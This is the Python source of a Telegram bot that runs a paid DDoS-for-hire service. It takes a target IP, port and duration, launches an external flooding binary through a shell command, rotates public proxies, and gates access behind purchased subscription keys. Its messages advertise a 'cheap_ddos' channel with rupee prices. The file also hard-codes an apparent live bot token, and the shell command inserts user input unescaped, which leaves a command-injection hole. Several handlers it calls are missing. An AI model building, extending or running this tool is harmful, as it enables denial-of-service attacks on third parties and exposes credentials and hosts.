import telebot
import subprocess
import secrets
import time
import threading
import requests
import itertools
import json
from datetime import datetime, timedelta, timezone
import os
import signal

user_attacks = {}
bot_token = '7283418311:AAE9T99yYG5m8ttpauMPQTC6dp0-N_tZ4kk'
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'

proxy_iterator = None
current_proxy = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def rotate_proxy(sent_message):
    global current_proxy
    while sent_message.time_remaining > 0:
        new_proxy = get_next_proxy()
        if new_proxy:
            current_proxy = new_proxy
            bot.proxy = {
                'http': f'http://{new_proxy}',
                'https': f'https://{new_proxy}'
            }
            if sent_message.time_remaining > 0:
                new_text = f"🚀⚡ ATTACK STARTED⚡🚀\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n⏰ Time: {sent_message.time_remaining} Seconds\n🛡️ Proxy: RUNNING ON ryuk SERVER\n"
                try:
                    bot.edit_message_text(new_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
                except telebot.apihelper.ApiException as e:
                    if "message is not modified" not in str(e):
                        print(f"Error updating message: {str(e)}")
        time.sleep(5)

bot = telebot.TeleBot(bot_token)

ADMIN_ID = 1338724139,5181364124

def load_data():
    try:
        with open('ryuk.txt', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {"keys": {}, "users": {}}
    except json.JSONDecodeError:
        return {"keys": {}, "users": {}}

# Save data to ryuk.txt
def save_data(data):
    with open('ryuk.txt', 'w') as file:
        json.dump(data, file, default=str)

data = load_data()

def generate_one_time_key():
    return secrets.token_urlsafe(16)

def validate_key(key):
    keys = data['keys']
    if key in keys and not keys[key].get('used', False):
        return True, key
    return False, None

def set_key_as_used(key):
    keys = data['keys']
    if key in keys:
        keys[key]['used'] = True
        save_data(data)

def correct_expiry_dates():
    corrected = False
    for user_id, user_data in data.get('users', {}).items():
        expiry_date_str = user_data.get('expiry_date')
        if not isinstance(expiry_date_str, str):
            print(f"Correcting invalid expiry_date for user {user_id}")
            # Set a default date or handle as needed
            user_data['expiry_date'] = datetime.now(timezone.utc).isoformat()
            corrected = True
        else:
            try:
                # Validate the expiry_date format
                datetime.fromisoformat(expiry_date_str)
            except ValueError:
                print(f"Correcting invalid expiry_date format for user {user_id}")
                user_data['expiry_date'] = datetime.now(timezone.utc).isoformat()
                corrected = True
    if corrected:
        save_data(data)

def check_key_expiration(user_id):
    users = data['users']
    if user_id in users:
        user_data = users[user_id]
        expiry_date_str = user_data.get('expiry_date')
        if expiry_date_str:
            try:
                expiry_date = datetime.fromisoformat(expiry_date_str)
                now = datetime.now(timezone.utc)
                if now > expiry_date:
                    user_data['valid'] = False
                    save_data(data)
                    return False
                return user_data.get('valid', False)
            except ValueError:
                print(f"Invalid expiry_date format: {expiry_date_str}")
                user_data['valid'] = False
                save_data(data)
                return False
    return False

def handle_generate_key(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        telebot.types.KeyboardButton("1 day"),
        telebot.types.KeyboardButton("3 days"),
        telebot.types.KeyboardButton("7 days"),
        telebot.types.KeyboardButton("30 days"),
        telebot.types.KeyboardButton("60 days")
    )
    bot.send_message(message.chat.id, "Select the number of days for the key:", reply_markup=markup)
    bot.register_next_step_handler(message, process_key_generation)

def process_key_generation(message):
    days_map = {
        "1 day": 1,
        "3 days": 3,
        "7 days": 7,
        "30 days": 30,
        "60 days": 60
    }
    days = days_map.get(message.text)
    if days:
        new_key = generate_one_time_key()
        expiry_date = datetime.now(timezone.utc) + timedelta(days=days)
        data['keys'][new_key] = {"used": False, "expiry_date": expiry_date.isoformat()}
        save_data(data)
        bot.send_message(message.chat.id, f"Your new key is: {new_key}")
    else:
        bot.send_message(message.chat.id, "Invalid choice. Please try again.")

def handle_paste_key(message):
    bot.send_message(message.chat.id, "Paste your key:")
    bot.register_next_step_handler(message, process_key_paste)

def process_key_paste(message):
    key = message.text.strip()
    valid = validate_key(key)[0]
    if valid:
        user_id = str(message.from_user.id)
        expiry_date = datetime.now(timezone.utc) + timedelta(days=30)  # Default validity period, can be adjusted
        data['users'][user_id] = {"key": key, "expiry_date": expiry_date.isoformat(), "valid": True}
        set_key_as_used(key)
        save_data(data)
        bot.send_message(message.chat.id, "Key has been successfully activated!")
    else:
        bot.send_message(message.chat.id, "Invalid or expired key.")

def handle_my_account(message):
    user_id = str(message.from_user.id)
    if user_id in data['users']:
        user_data = data['users'][user_id]
        expiry_date = user_data.get('expiry_date', 'N/A')
        validity = "Valid" if user_data.get('valid', False) else "Expired"
        bot.send_message(message.chat.id, f"Your account details:\n\nKey: {user_data.get('key', 'None')}\nExpiry Date: {expiry_date}\nValidity: {validity}")
    else:
        bot.send_message(message.chat.id, "No account found. Please activate your key first.")

@bot.message_handler(commands=['start'])
def handle_start(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        telebot.types.KeyboardButton("🔥 Attack"),
        telebot.types.KeyboardButton("🛑 Stop"),
        telebot.types.KeyboardButton("📞 Contact Admin"),
        telebot.types.KeyboardButton("🔑 Generate Key"),
        telebot.types.KeyboardButton("📋 Paste Key"),
        telebot.types.KeyboardButton("👤 My Account"),
        telebot.types.KeyboardButton("⚙️ Admin Panel")
    )
    bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "🔥 Attack":
        handle_attack_init(message)
    elif message.text == "🛑 Stop":
        handle_stop(message)
    elif message.text == "📞 Contact Admin":
        handle_contact_admin(message)
    elif message.text == "🔑 Generate Key":
        handle_generate_key(message)
    elif message.text == "📋 Paste Key":
        handle_paste_key(message)
    elif message.text == "👤 My Account":
        handle_my_account(message)
    elif message.text == "⚙️ Admin Panel":
        handle_admin_panel(message)
    elif message.text == "🔙 Back":
        handle_start(message)
    elif message.text == "❌ Delete Key":
        handle_delete_key_prompt(message)
    elif message.text == "🗑️ Delete All":
        handle_delete_all(message)

def handle_attack_init(message):
    bot.send_message(message.chat.id, "Enter the target IP, port, and time in the format: <IP> <port> <time>")
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    try:
        command_parts = message.text.split()
        if len(command_parts) < 3:
            bot.reply_to(message, "Usage: <IP> <port> <time>")
            return

        username = message.from_user.username
        user_id = str(message.from_user.id)
        target = command_parts[0]
        port = command_parts[1]
        attack_time = int(command_parts[2])

        if not check_key_expiration(user_id):
            bot.reply_to(message, "🚫 Your subscription has expired or is invalid.\n\nFirst Join Our Channel :- https://t.me/cheap_ddos\nPlans :- 1 Day ₹50\nPlan No 2 :- Week ₹300\nContact To Get Attack Plan @sivsiv11")
            return

        response = f"@{username}\n⚡ ATTACK STARTED ⚡\n\n🎯 Target: {target}\n🔌 Port: {port}\n⏰ Time: {attack_time} Seconds\n🛡️ Proxy: RUNNING ON ryuk SERVER \n"
        sent_message = bot.reply_to(message, response)
        sent_message.target = target
        sent_message.port = port
        sent_message.time_remaining = attack_time

        attack_thread = threading.Thread(target=run_attack, args=(target, port, attack_time, sent_message))
        attack_thread.start()

        time_thread = threading.Thread(target=update_remaining_time, args=(attack_time, sent_message))
        time_thread.start()

        proxy_thread = threading.Thread(target=rotate_proxy, args=(sent_message,))
        proxy_thread.start()

    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")

def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./soul {target} {port} {attack_time} 70"
        attack_process = subprocess.Popen(full_command, shell=True)
        
        user_attacks[sent_message.chat.id] = attack_process.pid
        attack_process.wait()

        sent_message.time_remaining = 0
        final_response = "🚀⚡ ATTACK FINISHED⚡🚀"
        try:
            bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
        except telebot.apihelper.ApiException as e:
            if "message is not modified" not in str(e):
                print(f"Error updating message: {str(e)}")

        if sent_message.chat.id in user_attacks:
            del user_attacks[sent_message.chat.id]

    except Exception as e:
        bot.send_message(sent_message.chat.id, f"⚠️ An error occurred: {str(e)}")

def handle_stop(message):
    user_id = message.chat.id
    if user_id in user_attacks:
        pid = user_attacks[user_id]
        try:
            os.kill(pid, signal.SIGTERM)  # Terminate the process
            bot.send_message(message.chat.id, "⚡ Attack stopped.")
            
            del user_attacks[user_id]
        except ProcessLookupError:
            bot.send_message(message.chat.id, "⚠️ No active attack found to stop.")
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ An error occurred while stopping the attack: {str(e)}")
    else:
        bot.send_message(message.chat.id, "⚠️ No active attack found to stop.")

def update_remaining_time(attack_time, sent_message):
    last_message_text = None
    for remaining in range(attack_time, 0, -1):
        if sent_message.time_remaining > 0:
            sent_message.time_remaining = remaining
            new_text = f"🚀⚡ ATTACK STARTED⚡🚀\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n⏰ Time: {remaining} Seconds\n🛡️ Proxy: RUNNING ON ryuk SERVER\n"
            
            if new_text != last_message_text:
                try:
                    bot.edit_message_text(new_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
                    last_message_text = new_text
                except telebot.apihelper.ApiException as e:
                    if "message is not modified" not in str(e):
                        print(f"Error updating message: {str(e)}")
        
        time.sleep(1)

    if sent_message.time_remaining <= 0:
        final_response = "🚀⚡ ATTACK FINISHED⚡🚀"
        try:
            bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
        except telebot.apihelper.ApiException as e:
            if "message is not modified" not in str(e):
                print(f"Error updating message: {str(e)}")

def start_bot():
    # Correct any date format issues before starting the bot
    correct_expiry_dates()
    
    while True:
        try:
            bot.polling(none_stop=True, timeout=30, interval=1)
        except Exception as e:
            print(f"Error: {str(e)}")
            time.sleep(15)

if __name__ == "__main__":
    # Load data and start the bot
    data = load_data()
    start_bot()
